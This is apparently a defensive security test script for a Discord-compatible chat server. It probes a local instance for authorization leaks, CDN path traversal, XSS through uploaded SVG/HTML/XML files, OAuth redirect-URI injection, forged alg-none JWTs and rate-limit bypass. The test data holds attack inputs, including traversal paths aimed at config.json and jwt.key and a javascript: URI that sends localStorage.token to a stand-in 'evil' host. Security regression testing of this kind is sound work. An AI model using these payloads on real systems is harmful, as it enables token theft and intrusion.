/* SPDX-License-Identifier: AGPL-3.0-only */
import { randomBytes } from "node:crypto";
import { solveCap } from "./cap-token.mjs";

const origin = `http://localhost:${process.env.PORT || 3001}`;
const api = `${origin}/api/v9`;
const results = [];

const request = async (method, path, token, body, headers = {}) => {
    const isForm = body instanceof FormData;
    const res = await fetch(path.startsWith("http") ? path : `${api}${path}`, {
        method,
        redirect: "manual",
        headers: { ...(!isForm && body && { "content-type": "application/json" }), ...(token && { authorization: token }), ...headers },
        body: isForm ? body : body && JSON.stringify(body),
    });
    const text = await res.text();
    let json;
    try {
        json = text ? JSON.parse(text) : null;
    } catch {
        json = null;
    }
    return { status: res.status, headers: res.headers, text, json };
};

const must = async (method, path, token, body) => {
    const res = await request(method, path, token, body);
    if (res.status >= 300) throw new Error(`${method} ${path} returned HTTP ${res.status}: ${res.text.slice(0, 200)}`);
    return res.json;
};

const check = async (name, attack) => {
    try {
        const detail = await attack();
        results.push({ name, pass: detail === true || detail === undefined, detail: detail === true ? "" : detail });
    } catch (error) {
        results.push({ name, pass: false, detail: error.message });
    }
};

const register = async (role) => {
    const username = `${role}_${randomBytes(3).toString("hex")}`;
    const password = randomBytes(12).toString("hex");
    const { token } = await must("POST", "/auth/register", null, {
        email: `${username}@security-probe.test`,
        username,
        password,
        date_of_birth: "2000-01-01",
        consent: true,
        captcha_key: await solveCap({ origin }),
    });
    const user = await must("GET", "/users/@me", token);
    return { token, id: user.id };
};

const gateway = (onOpen) =>
    new Promise((resolve) => {
        const socket = new WebSocket(`${origin.replace("http", "ws")}/?v=9&encoding=json`);
        const frames = [];
        const finish = (closeCode) => {
            clearTimeout(timer);
            resolve({ frames, closeCode });
        };
        const timer = setTimeout(() => {
            socket.close();
            finish(null);
        }, 8000);
        socket.addEventListener("message", (event) => {
            const frame = JSON.parse(String(event.data));
            frames.push(frame);
            if (frame.op === 10) onOpen(socket, frames);
        });
        socket.addEventListener("close", (event) => finish(event.code));
    });

const identify = (socket, token) => socket.send(JSON.stringify({ op: 2, d: { token, capabilities: 16381, properties: { os: "Mac OS X", browser: "probe" }, compress: false } }));

const victim = await register("probevictim");
const attacker = await register("probeattacker");

const victimGuild = await must("POST", "/guilds", victim.token, { name: "Victim Guild" });
const victimChannel = (await must("GET", `/guilds/${victimGuild.id}/channels`, victim.token)).find((channel) => channel.type === 0);
const victimMessage = await must("POST", `/channels/${victimChannel.id}/messages`, victim.token, { content: "victim secret" });
const attackerGuild = await must("POST", "/guilds", attacker.token, { name: "Attacker Guild" });
const attackerChannel = (await must("GET", `/guilds/${attackerGuild.id}/channels`, attacker.token)).find((channel) => channel.type === 0);

await check("dm history of a user without a shared dm leaks no messages", async () => {
    const res = await request("GET", `/users/${victim.id}/messages`, attacker.token);
    if (res.status !== 200 || !Array.isArray(res.json)) return `HTTP ${res.status}`;
    if (res.json.length) return `got ${res.json.length} messages`;
    await must("PUT", `/users/@me/relationships/${victim.id}`, attacker.token, {});
    await must("PUT", `/users/@me/relationships/${attacker.id}`, victim.token, {});
    await must("POST", "/users/@me/channels", attacker.token, { recipients: [victim.id] });
    const shared = await request("GET", `/users/${victim.id}/messages`, attacker.token);
    if (shared.status !== 200 || !Array.isArray(shared.json) || shared.text.includes(victimMessage.id))
        return `shared dm history returned HTTP ${shared.status} ${shared.text.slice(0, 120)}`;
});

await check("pinning a message from another guild's channel is refused", async () => {
    const res = await request("PUT", `/channels/${attackerChannel.id}/pins/${victimMessage.id}`, attacker.token);
    if (res.status < 400) return `HTTP ${res.status}`;
    const pins = await request("GET", `/channels/${victimChannel.id}/pins`, victim.token);
    if (pins.text.includes(victimMessage.id)) return "victim message got pinned";
});

await check("a non-member can't list a guild's channels", async () => {
    const res = await request("GET", `/guilds/${victimGuild.id}/channels`, attacker.token);
    if (res.status < 400) return `HTTP ${res.status}`;
});

await check("an unauthenticated gateway socket is closed when it sends op 12", async () => {
    const { closeCode } = await gateway((socket) => socket.send(JSON.stringify({ op: 12, d: [victimGuild.id] })));
    if (closeCode !== 4003) return `close code ${closeCode}`;
});

await check("op 14 doesn't hand out presences of a guild the user isn't in", async () => {
    const online = await new Promise((resolve) => {
        const socket = new WebSocket(`${origin.replace("http", "ws")}/?v=9&encoding=json`);
        socket.addEventListener("message", (event) => {
            const frame = JSON.parse(String(event.data));
            if (frame.op === 10) identify(socket, victim.token);
            if (frame.t === "READY") {
                socket.send(JSON.stringify({ op: 3, d: { status: "online", since: 0, activities: [], afk: false } }));
                setTimeout(() => resolve(socket), 500);
            }
        });
    });
    const { frames } = await gateway((socket, frames) => {
        identify(socket, attacker.token);
        const ready = setInterval(() => {
            if (!frames.some((frame) => frame.t === "READY")) return;
            clearInterval(ready);
            socket.send(
                JSON.stringify({ op: 14, d: { guild_id: victimGuild.id, members: [victim.id], channels: { [victimChannel.id]: [[0, 99]] }, typing: true, activities: true } }),
            );
            setTimeout(() => socket.close(), 2000);
        }, 100);
    });
    online.close();
    const leaked = frames.filter((frame) => frame.t && frame.t !== "READY" && frame.t !== "READY_SUPPLEMENTAL" && JSON.stringify(frame.d ?? "").includes(victim.id));
    if (!frames.some((frame) => frame.t === "READY")) return "never got READY";
    if (leaked.length) return `leaked in ${leaked.map((frame) => frame.t).join(", ")}`;
});

await check("cdn path traversal is refused", async () => {
    for (const path of [`/avatars/..%2Fattachments%2F${victimChannel.id}/x.png`, "/avatars/%2e%2e/%2e%2e/config.json", `/icons/..%5C..%5Cjwt.key/x.png`]) {
        const res = await request("GET", `${origin}${path}`);
        if (res.status !== 404) return `${path} returned HTTP ${res.status}`;
    }
});

await check("an uploaded svg or html attachment is served as a sandboxed download", async () => {
    for (const [filename, type, content] of [
        ["x.svg", "image/svg+xml", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'],
        ["x.html", "text/html", "<script>alert(1)</script>"],
        ["x.xml", "application/xml", '<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>'],
    ]) {
        const form = new FormData();
        form.append("payload_json", JSON.stringify({ content: "" }));
        form.append("files[0]", new Blob([content], { type }), filename);
        const message = await must("POST", `/channels/${attackerChannel.id}/messages`, attacker.token, form);
        const res = await request("GET", message.attachments[0].url);
        const served = res.headers.get("content-type") ?? "";
        if (/svg|html|xml/i.test(served)) return `${filename} served as ${served}`;
        if (!/sandbox/.test(res.headers.get("content-security-policy") ?? "")) return `${filename} has no sandbox policy`;
        if (res.headers.get("x-content-type-options") !== "nosniff") return `${filename} has no nosniff`;
    }
});

await check("oauth2 applications refuse javascript and data redirect uris", async () => {
    const app = await must("POST", "/applications", attacker.token, { name: "probe app" });
    for (const uri of ["javascript:fetch('//evil/'+localStorage.token)", "data:text/html,<script>alert(1)</script>", " javascript:alert(1)"]) {
        const res = await request("PATCH", `/applications/${app.id}`, attacker.token, { redirect_uris: [uri] });
        if (res.status < 400) return `${uri} accepted`;
    }
    const authorize = await request(
        "GET",
        `/oauth2/authorize?client_id=${app.id}&response_type=code&scope=identify&redirect_uri=${encodeURIComponent("javascript:alert(1)")}`,
        attacker.token,
    );
    if (authorize.text.includes("javascript:")) return "authorize echoed a javascript uri";
});

await check("the client and api can't be framed by other sites", async () => {
    for (const path of ["/app", "/login", "/api/v9/gateway"]) {
        const res = await request("GET", `${origin}${path}`);
        if (!/frame-ancestors 'self'/.test(res.headers.get("content-security-policy") ?? "")) return `${path} has no frame-ancestors`;
        if (res.headers.get("x-content-type-options") !== "nosniff") return `${path} has no nosniff`;
    }
});

await check("an email verification ticket for another user can't be forged", async () => {
    const res = await request("POST", "/auth/verify", null, { token: "eyJhbGciOiJub25lIn0.eyJ0eXAiOiJlbWFpbF92ZXJpZnkiLCJ1aWQiOiIxIn0." });
    if (res.status < 400 || res.json?.token) return `HTTP ${res.status}`;
});

await check("changing the case or slashes of a path doesn't reset its rate limit", async () => {
    const variants = ["/auth/login", "/auth/LOGIN", "/Auth/Login/", "//auth//login", "/auth/%6cogin", "/AUTH/login"];
    let previous;
    for (const variant of variants) {
        const res = await request("POST", variant, null, { login: "nobody@security-probe.test", password: "wrong password" });
        if (res.status === 404) continue;
        const bucket = res.headers.get("x-ratelimit-bucket");
        const remaining = Number(res.headers.get("x-ratelimit-remaining"));
        if (res.status === 429) return;
        if (bucket !== "POST auth/login") return `${variant} counted in bucket ${bucket}`;
        if (previous !== undefined && remaining >= previous) return `${variant} got a fresh count of ${remaining}`;
        previous = remaining;
    }
});

for (const { name, pass, detail } of results) console.log(`${pass ? "pass" : "fail"}  ${name}${detail ? `  (${detail})` : ""}`);
const failed = results.filter((result) => !result.pass).length;
console.log(`${results.length - failed} passed, ${failed} failed`);
process.exit(failed ? 1 : 0);
